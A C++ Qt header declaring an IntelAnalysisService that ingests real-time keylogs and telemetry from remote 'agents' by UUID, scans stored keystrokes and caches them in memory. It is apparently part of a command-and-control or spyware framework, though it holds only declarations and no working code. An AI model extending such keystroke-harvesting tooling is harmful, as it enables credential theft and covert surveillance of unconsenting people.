#pragma once

#include <QObject>
#include <QMap>
#include <QString>
#include <string>

namespace inferno {

class IntelAnalysisService : public QObject {
    Q_OBJECT

public:
    static IntelAnalysisService& instance();

    // Process incoming real-time keylogs
    void processKeylog(const QString& uuid, const QString& data);

    // Process real-time telemetry line
    void processTelemetry(const QString& uuid, const QString& text, const QString& contextLabel);

    // Run full historical scan on DB (keylogs + telemetry)
    int runHistoricalScan(const QString& uuid);

signals:
    void intelligenceUpdated(const QString& uuid);

private:
    IntelAnalysisService() = default;
    ~IntelAnalysisService() = default;

    IntelAnalysisService(const IntelAnalysisService&) = delete;
    IntelAnalysisService& operator=(const IntelAnalysisService&) = delete;

    int runAnalysisPipeline(const QString& uuid, const std::string& text, const QString& contextLabel);

    QMap<QString, QString> m_agentRawKeylogs; // In-memory keystroke buffer cache
};

} // namespace inferno
